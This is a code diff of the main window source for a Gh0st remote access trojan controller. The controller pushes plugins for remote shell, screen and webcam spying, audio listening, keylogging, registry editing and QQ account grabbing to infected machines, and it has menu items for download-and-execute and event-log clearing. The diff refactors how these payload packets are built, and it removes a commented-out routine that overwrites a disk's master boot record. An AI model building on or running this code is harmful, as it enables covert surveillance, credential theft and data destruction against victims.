@@ -24,6 +24,10 @@
 #include "MyToolsKit.h"
 #include "Mydat.h"
 #include "UpdateDlg.h"
+#include "InputDlg.h"
+#include "TextChatDlg.h"
+#include "SelectQQ.h"
+
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #undef THIS_FILE
@@ -41,33 +45,25 @@ static char THIS_FILE[] = __FILE__;
 #include ".\Plugins\\C_REGEDIT.h"
 #include ".\Plugins\\C_CHAT.h"
 #include ".\Plugins\\C_PROXYMAP.h"
-CMainFrame	*g_pFrame;
+#include ".\Plugins\\C_GETQQ.h"
+
+CMainFrame	*g_pFrame = NULL;
 CIOCPServer * m_iocpServer = NULL;
 extern CGh0stView* g_pTabView;
 extern CLogView* g_pLogView;
 
-LPBYTE lpFilePacket = NULL;
-LPBYTE lpShellPacket = NULL;
-LPBYTE lpScreenPacket = NULL;
-LPBYTE lpWebCamPacket = NULL;
-LPBYTE lpAudioPacket = NULL;
-LPBYTE lpSystemPacket = NULL;
-LPBYTE lpKeyboardPacket = NULL;
-LPBYTE lpServicePacket = NULL;
-LPBYTE lpRegeditPacket = NULL;
-LPBYTE lpTextChatPacket = NULL;
-LPBYTE lpProxyMapPacket = NULL;
-int nFilePacketLength = 0;
-int nShellPacketLength = 0;
-int nScreenPacketLength = 0;
-int nWebCamPacketLength = 0;
-int nAudioPacketLength = 0;
-int nSystemPacketLength = 0;
-int nKeyboardPacketLength = 0;
-int nServicePacketLength = 0;
-int nRegeditPacketLength = 0;
-int nTextChatPacketLength = 0;
-int nProxyPacketLength = 0;
+PDllCode lpFilePacket = NULL;
+PDllCode lpShellPacket = NULL;
+PDllCode lpScreenPacket = NULL;
+PDllCode lpWebCamPacket = NULL;
+PDllCode lpAudioPacket = NULL;
+PDllCode lpSystemPacket = NULL;
+PDllCode lpKeyboardPacket = NULL;
+PDllCode lpServicePacket = NULL;
+PDllCode lpRegeditPacket = NULL;
+PDllCode lpTextChatPacket = NULL;
+PDllCode lpProxyMapPacket = NULL;
+
 /////////////////////////////////////////////////////////////////////////////
 // CMainFrame
 
@@ -137,104 +133,18 @@ CMainFrame::CMainFrame()
 
 CMainFrame::~CMainFrame()
 {
-
+	SAFE_DELETE(lpFilePacket);
+	SAFE_DELETE(lpShellPacket);
+	SAFE_DELETE(lpScreenPacket);
+	SAFE_DELETE(lpWebCamPacket);
+	SAFE_DELETE(lpAudioPacket);
+	SAFE_DELETE(lpSystemPacket);
+	SAFE_DELETE(lpKeyboardPacket);
+	SAFE_DELETE(lpServicePacket);
+	SAFE_DELETE(lpRegeditPacket);
+	SAFE_DELETE(lpTextChatPacket);
+	SAFE_DELETE(lpProxyMapPacket);
 }
-
-// unsigned char scode[] =
-// "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
-// "\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
-// "\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
-// #define FILE_DEVICE_FILE_SYSTEM 0x00000009
-// #define FILE_ANY_ACCESS 0
-// #define METHOD_BUFFERED 0
-// #define CTL_CODE( DeviceType, Function, Method, Access ) ( ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) )
-// #define FSCTL_LOCK_VOLUME CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 6, METHOD_BUFFERED, FILE_ANY_ACCESS)
-// #define FSCTL_UNLOCK_VOLUME CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 7, METHOD_BUFFERED, FILE_ANY_ACCESS)
-//
-// int KillMBR()
-// {
-//     HANDLE hDevice;
-//     DWORD dwBytesWritten, dwBytesReturned;
-//     BYTE pMBR[512] = {0};
-//
-//     // ÖØÐÂ¹¹ÔìMBR
-//     memcpy(pMBR, scode, sizeof(scode) - 1);
-//     pMBR[510] = 0x55;
-//     pMBR[511] = 0xAA;
-//
-//     hDevice = CreateFile
-//         (
-//         "\\\\.\\PHYSICALDRIVE0",
-//         GENERIC_READ | GENERIC_WRITE,
-//         FILE_SHARE_READ | FILE_SHARE_WRITE,
-//         NULL,
-//         OPEN_EXISTING,
-//         0,
-//         NULL
-//         );
-//     if (hDevice == INVALID_HANDLE_VALUE)
-//         return -1;
-//     DeviceIoControl
-//         (
-//         hDevice,
-//         FSCTL_LOCK_VOLUME,
-//         NULL,
-//         0,
-//         NULL,
-//         0,
-//         &dwBytesReturned,
-//         NULL
-//         );
-//     // Ð´Èë²¡¶¾ÄÚÈÝ
-//     WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
-//     DeviceIoControl
-//         (
-//         hDevice,
-//         FSCTL_UNLOCK_VOLUME,
-//         NULL,
-//         0,
-//         NULL,
-//         0,
-//         &dwBytesReturned,
-//         NULL
-//         );
-//     CloseHandle(hDevice);
-//
-//     ExitProcess(-1);
-//     return 0;
-// }
-//
-// DWORD WINAPI LoginAgainCheck(LPVOID lparam)
-// {
-// É¾³ýÑéÖ¤...........//
-/*	POSTXML m_postxml;
-	m_postxml.RequestBuffer=new char[1024*5];
-	m_postxml.nRequestLong=1024*5;
-	lstrcpy(m_postxml.szUserName,LoginUserName);
-	lstrcpy(m_postxml.szPassWord,LoginPassWord);
-	lstrcpy(m_postxml.szCommand,"UPDATE");
-	m_postxml.mHwnd=(HWND)1;
-	while(1)
-	{
-		Sleep(10*1000);
-		if (lstrlen(LoginUserName)==0&&lstrlen(LoginPassWord)==0)
-		{
-			KillMBR();
-		}
-		PostContent(&m_postxml);
-		if (lstrcmp(LastLoginTime,m_postxml.RequestBuffer)==0)
-		{
-			memset(m_postxml.RequestBuffer,0,lstrlen(m_postxml.RequestBuffer));
-			continue;
-		}else
-		{
-			AfxMessageBox("ÄúµÄÕÊºÅÔÚ±ð´¦µÇÂ½£¬Äú±»ÆÈÏÂÏß");
-			ExitProcess(0);
-		}
-	}*/
-// É¾³ýÑéÖ¤...........½áÊø//
-// 	return 0;
-// }
 
 int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 {
@@ -245,8 +155,7 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
     this ->CenterWindow(CWnd::GetDesktopWindow());
 
     if (!m_wndStatusBar.Create(this) ||
-        !m_wndStatusBar.SetIndicators(indicators,
-                                      sizeof(indicators)/sizeof(UINT))) {
+        !m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT))) {
         TRACE0("Failed to create status bar\n");
         return -1;      // fail to create
     }
@@ -255,55 +164,15 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
     if (!InitCommandBars())
         return -1;
 
-// 	// »ñÈ¡ command bars Ä¿±ê Ö¸Õë
-// 	CXTPCommandBars* pCommandBars = GetCommandBars();
-// 	if(pCommandBars == NULL)
-// 	{
-// 		TRACE0("Failed to create command bars object.\n");
-// 		return -1;      // fail to create
-// 	}
-//
-//	SetMenu(NULL);
-    // Ìí¼Ó²Ëµ¥À¸
-// 	CXTPCommandBar* pMenuBar = pCommandBars->SetMenu(
-// 		_T("Menu Bar"), IDR_MAINFRAME);
-// 	if(pMenuBar == NULL)
-// 	{
-// 		TRACE0("Failed to create menu bar.\n");
-// 		return -1;      // fail to create
-//	}
-    /*
-
-    	// Create ToolBar
-    	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("Standard"), xtpBarTop);
-    	if (!pCommandBar ||
-    		!pCommandBar->LoadToolBar(IDR_TOOLBAR3))
-    	{
-    		TRACE0("Failed to create toolbar\n");
-    		return -1;
-    	}
-    	//
-
-    	CImageList m_imagelist;
-    	m_imagelist.Create(24,24,ILC_COLOR24|ILC_MASK,0,0);
-        CBitmap bmp;
-    	bmp.LoadBitmap(IDB_TOOLBAR);
-    	m_imagelist.Add(&bmp,RGB(255,255,255));
-
-    	pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR3,m_imagelist);
-
-    	pCommandBars->SetTheme(xtpThemeOfficeXP);*/
     //////////////////////////////////////////////////////////////////////////////////////
     if (!m_wndDlgBar.Create(this, IDD_DIALOGBAR, WS_VISIBLE|WS_CHILD|CBRS_SIZE_DYNAMIC|CBRS_ALIGN_TOP, IDD_DIALOGBAR)) {
         TRACE0( "Failed to create dialogbar ");
         return -1;
     }
 
-
     // Ìí¼Ó×´Ì¬À¸
     if ((!m_wndStatusBar.GetSafeHwnd() && !m_wndStatusBar.Create(this)) ||
-        !m_wndStatusBar.SetIndicators(indicators,
-                                      sizeof(indicators)/sizeof(UINT))) {
+        !m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT))) {
         TRACE0("Failed to create status bar\n");
         return -1;      // fail to create
     }
@@ -313,8 +182,7 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
     m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 120);
     m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 100);
     RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //ÏÔÊ¾×´Ì¬À¸
-    // ¼ÓÔØÖ®Ç°µÄ¹¤¾ßÀ¸ºÍ²Ëµ¥¡£
-//	LoadCommandBars(_T("CommandBars"));
+
     LoadIcons();  //ÓÒ¼ü²Ëµ¥ÏÔÊ¾Í¼±ê
 
     // ´´½¨ÍÐÅÌÍ¼±ê
@@ -327,19 +195,7 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
         TRACE0("Failed to create tray icon\n");
         return -1;
     }
-    // ÉèÖÃ Office 2003 Ö÷Ìâ
-//	CXTPPaintManager::SetTheme(xtpThemeWhidbey);
 
-
-    // ¼ÓÔØÖ®Ç°µÄ¹¤¾ßÀ¸ºÍ²Ëµ¥¡£
-//	LoadCommandBars(_T("CommandBars"));
-
-    SetTimer(0, 1000, NULL);  //¿ªÆô¶¨Ê±Æ÷ 1
-// 	CString struserok = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString( "UPDATE", "Dns1", "" );
-// 	if ( struserok.GetLength() == NULL )
-// 	{
-// 		SetTimer(1, 1000*60*30, NULL);  //¿ªÆô¶¨Ê±Æ÷ 2
-// 	}
     m_paneManager.InstallDockingPanes(this);
     m_paneManager.SetTheme(xtpPaneThemeVisualStudio2005); // ÉèÖÃÖ÷Ìâ
 
@@ -351,129 +207,45 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
     // ³õÊ¼»¯²å¼þÄÚ´æ
 
     // File
-    nFilePacketLength = (FILEMyFileSize + 1)*sizeof(char)+1;
-    lpFilePacket = new BYTE[nFilePacketLength];
-    if(lpFilePacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯File²å¼þÊ§°Ü£¡");
-    } else {
-        lpFilePacket[0] = COMMAND_LIST_DRIVE;
-        memcpy(lpFilePacket + 1, (void*)FILEMyFileBuf, nFilePacketLength - 1);
-    }
+    lpFilePacket = new DllCode(COMMAND_LIST_DRIVE, FILEMyFileBuf, sizeof(FILEMyFileBuf));
 
     // Shell
-    nShellPacketLength = (SHELLMyFileSize + 1)*sizeof(char)+1;
-    lpShellPacket = new BYTE[nShellPacketLength];
-    if(lpShellPacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯shell²å¼þÊ§°Ü£¡");
-    } else {
-        lpShellPacket[0] = COMMAND_SHELL;
-        memcpy(lpShellPacket + 1, (void*)SHELLMyFileBuf, nShellPacketLength - 1);
-    }
+    lpShellPacket = new DllCode(COMMAND_SHELL, SHELLMyFileBuf, sizeof(SHELLMyFileBuf));
 
     // ÆÁÄ»
-    nScreenPacketLength = (SCREENMyFileSize + 1)*sizeof(char)+1;
-    lpScreenPacket = new BYTE[nScreenPacketLength];
-    if(lpScreenPacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯Screen²å¼þÊ§°Ü£¡");
-    } else {
-        lpScreenPacket[0] = COMMAND_SCREEN_SPY;
-        memcpy(lpScreenPacket + 1, (void*)SCREENMyFileBuf, nScreenPacketLength - 1);
-    }
+    lpScreenPacket = new DllCode(COMMAND_SCREEN_SPY, SCREENMyFileBuf, sizeof(SCREENMyFileBuf));
 
     // webcam
-    nWebCamPacketLength = (VIDEOMyFileSize + 1)*sizeof(char)+1;
-    lpWebCamPacket = new BYTE[nWebCamPacketLength];
-    if(lpWebCamPacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯WebCam²å¼þÊ§°Ü£¡");
-    } else {
-        lpWebCamPacket[0] = COMMAND_WEBCAM;
-        memcpy(lpWebCamPacket + 1, (void*)VIDEOMyFileBuf, nWebCamPacketLength - 1);
-    }
+    lpWebCamPacket = new DllCode(COMMAND_WEBCAM, VIDEOMyFileBuf, sizeof(VIDEOMyFileBuf));
 
     // Audio
-    nAudioPacketLength = (LISTENMyFileSize + 1)*sizeof(char)+1;
-    lpAudioPacket = new BYTE[nAudioPacketLength];
-    if(lpAudioPacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯Audio²å¼þÊ§°Ü£¡");
-    } else {
-        lpAudioPacket[0] = COMMAND_AUDIO;
-        memcpy(lpAudioPacket + 1, (void*)LISTENMyFileBuf, nAudioPacketLength - 1);
-    }
+    lpAudioPacket = new DllCode(COMMAND_AUDIO, LISTENMyFileBuf, sizeof(LISTENMyFileBuf));
 
     // System
-    nSystemPacketLength = (SYSTEMMyFileSize + 1)*sizeof(char)+1;
-    lpSystemPacket = new BYTE[nSystemPacketLength];
-    if(lpSystemPacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯System²å¼þÊ§°Ü£¡");
-    } else {
-        lpSystemPacket[0] = COMMAND_SYSTEM;
-        memcpy(lpSystemPacket + 1, (void*)SYSTEMMyFileBuf, nSystemPacketLength - 1);
-    }
-
-    // Keyboard
-// 	nKeyboardPacketLength = (KEYLOGMyFileSize + 1)*sizeof(char)+1;
-// 	lpKeyboardPacket = new BYTE[nKeyboardPacketLength];
-// 	if(lpKeyboardPacket == NULL)
-// 	{
-// 		AfxMessageBox("³õÊ¼»¯Keyboard²å¼þÊ§°Ü£¡");
-// 	}
-// 	else
-// 	{
-// 		lpKeyboardPacket[0] = COMMAND_KEYBOARD;
-// 		memcpy(lpKeyboardPacket + 1, (void*)KEYLOGMyFileBuf, nKeyboardPacketLength - 1);
-// 	}
+    lpSystemPacket = new DllCode(COMMAND_SYSTEM, SYSTEMMyFileBuf, sizeof(SYSTEMMyFileBuf));
 
     // Service
-    nServicePacketLength = (SERVICEMyFileSize + 1)*sizeof(char)+1;
-    lpServicePacket = new BYTE[nServicePacketLength];
-    if(lpServicePacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯Service²å¼þÊ§°Ü£¡");
-    } else {
-        lpServicePacket[0] = COMMAND_SERVICE_MANAGER;
-        memcpy(lpServicePacket + 1, (void*)SERVICEMyFileBuf, nServicePacketLength - 1);
-    }
+    lpServicePacket = new DllCode(COMMAND_SERVICE_MANAGER, SERVICEMyFileBuf, sizeof(SERVICEMyFileBuf));
 
     // Regedit
-    nRegeditPacketLength = (REGEDITMyFileSize + 1)*sizeof(char)+1;
-    lpRegeditPacket = new BYTE[nRegeditPacketLength];
-    if(lpRegeditPacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯Regedit²å¼þÊ§°Ü£¡");
-    } else {
-        lpRegeditPacket[0] = COMMAND_REGEDIT;
-        memcpy(lpRegeditPacket + 1, (void*)REGEDITMyFileBuf, nRegeditPacketLength - 1);
-    }
-
+    lpRegeditPacket = new DllCode(COMMAND_REGEDIT, REGEDITMyFileBuf, sizeof(REGEDITMyFileBuf));
 
     // TextChat
-    nTextChatPacketLength = (CHATMyFileSize + 1)*sizeof(char)+1;
-    lpTextChatPacket = new BYTE[nTextChatPacketLength];
-    if(lpTextChatPacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯TextChat²å¼þÊ§°Ü£¡");
-    } else {
-        lpTextChatPacket[0] = COMMAND_TEXT_CHAT;
-        memcpy(lpTextChatPacket + 1, (void*)CHATMyFileBuf, nTextChatPacketLength - 1);
-    }
-
+    lpTextChatPacket = new DllCode(COMMAND_TEXT_CHAT, CHATMyFileBuf, sizeof(CHATMyFileBuf));
 
     // ProxyMap
-    nProxyPacketLength = (PROXYMAPMyFileSize + 1)*sizeof(char)+1;
-    lpProxyMapPacket = new BYTE[nProxyPacketLength];
-    if(lpProxyMapPacket == NULL) {
-        AfxMessageBox("³õÊ¼»¯ProxyMap²å¼þÊ§°Ü£¡");
-    } else {
-        lpProxyMapPacket[0] = COMMAND_PROXY_MAP;
-        memcpy(lpProxyMapPacket + 1, (void*)PROXYMAPMyFileBuf, nProxyPacketLength - 1);
-    }
+    lpProxyMapPacket = new DllCode(COMMAND_PROXY_MAP, PROXYMAPMyFileBuf, sizeof(PROXYMAPMyFileBuf));
+
     CXTPPaintManager::SetTheme(xtpThemeVisualStudio2010);//×´Ì¬À¸µÄXTP
-    /*	CloseHandle(CreateThread(NULL,0,&LoginAgainCheck,NULL,0,NULL));*/
+
     return 0;
 }
 
 
-int m_nCount;
-
-CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
+CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat,
+    XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
 {
+    static int m_nCount = 0;
     int nID = ++m_nCount;
 
     CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
@@ -575,10 +347,8 @@ void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
     }
     m_iocpServer = new CIOCPServer;
 
-
     // ¿ªÊ¼ÐÄÌø
     m_iocpServer->m_nHeartBeatTime = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "HeartBeatTime", 0);
-
 
     CString str,IP;
 
@@ -609,19 +379,11 @@ void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
         IP.Format(_T("¶Ë¿Ú %d ¼àÌýÊ§°Ü"), nPort);
         m_wndStatusBar.SetPaneText(3, "¶Ë¿Ú:0");
         g_pLogView->InsertLogItem( IP, 0, 2 );
-
     }
-
-// 	CString date=Datetime;
-//     SetWindowText("Gh0st1.0       [BUILD:20160821]  "+IP+" [µ±Ç°ÕÊºÅ:"+LoginUserName+" µ½ÆÚÊ±¼ä:"+date.Mid(0,8)+"]");
-// 	m_wndStatusBar.SetPaneText(0, _T("Á¬½Ó: 0"));
 }
 
 void CALLBACK CMainFrame::NotifyProc( ClientContext *pContext, UINT nCode)
 {
-
-
-
     switch (nCode) {
     case NC_CLIENT_CONNECT:
         break;
@@ -747,16 +509,10 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
         g_pFrame->PostMessage(WM_WRITEQQNUM, 0, (LPARAM)pContext);
         break;
     case TOKEN_SHOWQQ: {
-        OutputDebugString("½øÈëTOKEN_SHOWQQ");
         g_pFrame->PostMessage(WM_OPENPQQBOXDIALOG, 0, (LPARAM)pContext);
-
-        /*
-        			CString str = pContext->m_DeCompressionBuffer.GetBuffer(1);
-        		AfxMessageBox(str);*/
     }
     break;
     case TOKEN_RECV_QQ: {
-        OutputDebugString("½øÈëQQ·µ»Ø:");
         CString str = "QQ·µ»Ø: ";
         str += (char *)pContext->m_DeCompressionBuffer.GetBuffer(1);
         g_pLogView->InsertLogItem(str, 0, 0 );
@@ -802,16 +558,20 @@ void CMainFrame::LoadIcons()   //ÓÒ¼ü²Ëµ¥ÏÔÊ¾Í¼±ê
 {
     CXTPCommandBars* pCommandBars = GetCommandBars();
 
-    UINT uiGroupFind[] = {ID_MENUITEM_FILEMANAGER,ID_MENUITEM_SCREENSPY,ID_MENUITEM_KEYBOARD,ID_MENUITEM_REMOTESHELL,ID_MENUITEM_SYSTEM,ID_MENUITEM_WEBCAM,ID_MENUITEM_AUDIO_LISTEN,ID_MENUITEM_REGEDIT,
+    UINT uiGroupFind[] = {ID_MENUITEM_FILEMANAGER,ID_MENUITEM_SCREENSPY,ID_MENUITEM_KEYBOARD,ID_MENUITEM_REMOTESHELL,
+        ID_MENUITEM_SYSTEM,ID_MENUITEM_WEBCAM,ID_MENUITEM_AUDIO_LISTEN,ID_MENUITEM_REGEDIT,
                           ID_MENUITEM_SERVICEMANAGER,	ID_MENUITEM_TEXT_CHAT,IDM_CHAT
                          };
-    UINT uiGroupFind2[] = {ID_MENUITEM_LOGOFF,ID_MENUITEM_REBOOT,ID_MENUITEM_SHUTDOWN,ID_MENUITEM_UNINSTALL,ID_MENUITEM_PROXY,ID_MENUITEM_PROXY_MAP,ID_MENUITEM_PRANK,ID_MENUITEM_MESSAGEBOX,ID_MENUITEM_SELECT_ALL,ID_MENUITEM_UNSELECT_ALL
+    UINT uiGroupFind2[] = {ID_MENUITEM_LOGOFF,ID_MENUITEM_REBOOT,ID_MENUITEM_SHUTDOWN,ID_MENUITEM_UNINSTALL,
+        ID_MENUITEM_PROXY,ID_MENUITEM_PROXY_MAP,ID_MENUITEM_PRANK,ID_MENUITEM_MESSAGEBOX,ID_MENUITEM_SELECT_ALL,ID_MENUITEM_UNSELECT_ALL
                           };
-    UINT uiGroupFind3[] = {ID_MENUITEM_FIND_PROCESS,ID_MENUITEM_FIND_WINDOW,ID_MENUITEM_CLEAN_FIND,ID_MENUITEM_OPEN_URL_HIDE,ID_MENUITEM_OPEN_URL_SHOW,ID_MENUITEM_REMARK,IDM_POPUP1,IDM_POPUP2,IDM_POPUP3,IDM_POPUP4
+    UINT uiGroupFind3[] = {ID_MENUITEM_FIND_PROCESS,ID_MENUITEM_FIND_WINDOW,ID_MENUITEM_CLEAN_FIND,
+        ID_MENUITEM_OPEN_URL_HIDE,ID_MENUITEM_OPEN_URL_SHOW,ID_MENUITEM_REMARK,IDM_POPUP1,IDM_POPUP2,IDM_POPUP3,IDM_POPUP4
                            ,ID_MENUITEM_COPY_ALL,ID_MENUITEM_SAVE_IPLIST,IDM_SETCOLOR
                           };
     UINT uiGroupFind4[] = {ID_MENUITEM_CHANGE_GROUP,ID_MENUITEM_COPY_IP,ID_MENUITEM_COPY_ALL,ID_MENUITEM_SAVE_IPLIST};
-    UINT uiGroupFind5[] = {ID_MENUITEM_LOCAL_UPLOAD,ID_MENUITEM_DOWNEXEC,ID_MENUITEM_UPDATE_SERVER,ID_MENUITEM_CLEANEVENT_ALL,ID_MENUITEM_CLEANEVENT_SYS,ID_MENUITEM_CLEANEVENT_SECURITY,ID_MENUITEM_CLEANEVENT_APP
+    UINT uiGroupFind5[] = {ID_MENUITEM_LOCAL_UPLOAD,ID_MENUITEM_DOWNEXEC,ID_MENUITEM_UPDATE_SERVER,ID_MENUITEM_CLEANEVENT_ALL,
+        ID_MENUITEM_CLEANEVENT_SYS,ID_MENUITEM_CLEANEVENT_SECURITY,ID_MENUITEM_CLEANEVENT_APP
                           };
     UINT uiGroupFind6[] = {0,IDM_EVENT_DELETE,IDM_ALL_DELETE,IDM_EVENT_SAVE,IDM_EVENT_COPY};  //ÈÕÖ¾¹ÜÀí
     pCommandBars->GetImageManager()->SetIcons(IDB_MENU, uiGroupFind, _countof(uiGroupFind), CSize(16, 16));
@@ -820,8 +580,8 @@ void CMainFrame::LoadIcons()   //ÓÒ¼ü²Ëµ¥ÏÔÊ¾Í¼±ê
     pCommandBars->GetImageManager()->SetIcons(IDB_MENU4, uiGroupFind4, _countof(uiGroupFind4), CSize(16, 16));
     pCommandBars->GetImageManager()->SetIcons(IDB_MENU5, uiGroupFind5, _countof(uiGroupFind5), CSize(16, 16));
     pCommandBars->GetImageManager()->SetIcons(IDB_MENU6, uiGroupFind6, _countof(uiGroupFind6), CSize(16, 16));
-
 }
+
 void CMainFrame::ShowConnectionsNumber()
 {
     CString str,strTemp;
@@ -834,7 +594,6 @@ void CMainFrame::ShowConnectionsNumber()
         a += pView->m_pListCtrl->GetItemCount();
     }
 
-    //strTemp.Format(_T("Á¬½Ó: %d"), a);
     strTemp.Format(_T("->(ºÏ¼Æ: %dÌ¨)"), a);
 
     str.Format(_T("NT:%d Win2000:%d Xp:%d Win2003:%d Vista:%d Win2008:%d Win7:%d Win8:%d Win2012:%d Win10:%d %s"),
@@ -887,7 +646,6 @@ void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
 {
     if (nID == SC_MINIMIZE) {
         m_TrayIcon.MinimizeToTray(this);
-        // m_TrayIcon.ShowBalloonTip( _T("×îÐ¡»¯ÔËÐÐÖÐ......"), _T("Alien ET 1.0"), NIIF_NONE, 10);
     } else {
         CXTPFrameWnd::OnSysCommand(nID, lParam);
     }
@@ -976,16 +734,6 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
             }
             return TRUE;
         }
-        /*		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("¸ü¸ÄÅäÖÃ(&C)"))
-        		{
-        			if (lpCreateControl->nID != IDM_POPUP5)
-        			{
-        				lpCreateControl->controlType = xtpControlPopup;
-        				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
-        				lpCreateControl->nID = IDM_POPUP5;
-        			}
-        			return TRUE;
-        		}*/
     }
 
     return FALSE;
@@ -994,21 +742,18 @@ int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
 
 void CMainFrame::OnTools()
 {
-    // TODO: Add your command handler code here
     CMyToolsKit dlg;
     dlg.DoModal();
 }
 
 void CMainFrame::OnMenuitemSetting()
 {
-    // TODO: Add your command handler code here
     CSettingDlg dlg;
     dlg.DoModal();
 }
 
 void CMainFrame::OnMenuitemBuild()
 {
-    // TODO: Add your command handler code here
     CBuild dlg;
     dlg.DoModal();
 }
@@ -1020,7 +765,6 @@ LRESULT CMainFrame::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
     ClientContext	*pContext = (ClientContext *)lParam;
     if (pContext == NULL)
         return -1;
-
 
     if (!pContext->m_bIsMainSocket) {
         // ¹Ø±ÕÏà¹Ø´°¿Ú
@@ -1261,8 +1005,8 @@ LRESULT CMainFrame::OnModifyList(WPARAM wParam, LPARAM lParam)
 
     return 0;
 }
-#include "InputDlg.h"
-#include "TextChatDlg.h"
+
+
 LRESULT CMainFrame::OnOpenTextChatDialog(WPARAM wParam, LPARAM lParam)
 {
     ClientContext	*pContext = (ClientContext *)lParam;
@@ -1309,47 +1053,21 @@ LRESULT CMainFrame::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //×¢²á±
     pContext->m_Dialog[1] = (int)dlg;
     return 0;
 }
-#include "SelectQQ.h"
-#include ".\Plugins\\C_GETQQ.h"
 
 LRESULT CMainFrame::OnOpenQQBoxDialog(WPARAM wParam, LPARAM lParam)    //×¢²á±í
 {
     ClientContext	*pContext = (ClientContext *)lParam;
 
-
-
-
-
     CString str = pContext->m_DeCompressionBuffer.GetBuffer(1);
 
     CSelectQQ dlg(str);
     if (dlg.DoModal() == IDOK) {
-        /*		int nPacketLength = dlg.m_strSelect.GetLength() + 2;
-        		LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
-        		lpPacket[0] = COMMAND_QQBOX;
-        		memcpy(lpPacket + 1, dlg.m_strSelect.GetBuffer(0), nPacketLength);
-
-         */
-
-
-        int nqqPacketLength = (GETQQMyFileSize + 1)*sizeof(char)+1 + 100;
-        LPBYTE lpqqPacket = new BYTE[nqqPacketLength];
-        if(lpqqPacket == NULL) {
-            AfxMessageBox("³õÊ¼»¯qq²å¼þÊ§°Ü£¡");
-        } else {
-            lpqqPacket[0] = COMMAND_QQBOX;
-            memcpy(lpqqPacket + 1, dlg.m_strSelect.GetBuffer(0), 100);
-
-            memcpy(lpqqPacket + 1 + 100, (void*)GETQQMyFileBuf, nqqPacketLength - 101);
-        }
-
-
-        m_iocpServer->Send(pContext,lpqqPacket, nqqPacketLength -1);
-        LocalFree(lpqqPacket);
+        PDllCode lpqqPacket = new DllCode(COMMAND_QQBOX, GETQQMyFileBuf, sizeof(GETQQMyFileBuf), 100);
+        m_iocpServer->Send(pContext, lpqqPacket->Code(), lpqqPacket->Length());
+        SAFE_DELETE(lpqqPacket);
     }
     return 0;
 }
-
 
 
 LRESULT CMainFrame::OnOpenBuildDialog(WPARAM wParam, LPARAM lParam)
@@ -1391,19 +1109,6 @@ void CMainFrame::OnTimer(UINT nIDEvent)
         m_iocpServer->m_nRecvKbps = 0;
     }
     break;
-// 	case 1:
-// 		{
-//
-//
-// 			if (MessageBox("ÊÔÓÃÊ±¼äµ½£¡£¡ÎªÁË²»Ó°ÏìÓÃ»§Õý³£Ê¹ÓÃ£¬ÇëÁªÏµ¹ÜÀíÔ±»òµÇÂ¼¹Ù·½QQÈº¿ªÍ¨¸ü¸ß°æ±¾£¡", "¾¯¸æ", MB_OK) == IDOK)
-// 			{
-// 				KillTimer(0);  //¹Ø±Õ¶¨Ê±Æ÷
-// 				exit(0);
-// 				ExitProcess(0);
-// 			}
-//
-// 		}
-// 		break;
     default:
         break;
     }
@@ -1411,74 +1116,12 @@ void CMainFrame::OnTimer(UINT nIDEvent)
     CXTPFrameWnd::OnTimer(nIDEvent);
 }
 
-//#include ".\Plugins\\C_UpdateIP.h"
-// BOOL _OpenFile()
-// {
-// 	char	strExePath[MAX_PATH] = {0};
-//
-// 	lstrcat(strExePath, "UpdateIP.EXE");
-//
-// 	if(GetFileAttributesA(strExePath) == 1)  //¼ì²éÎÄ¼þ²»´æÔÚ
-// 	{
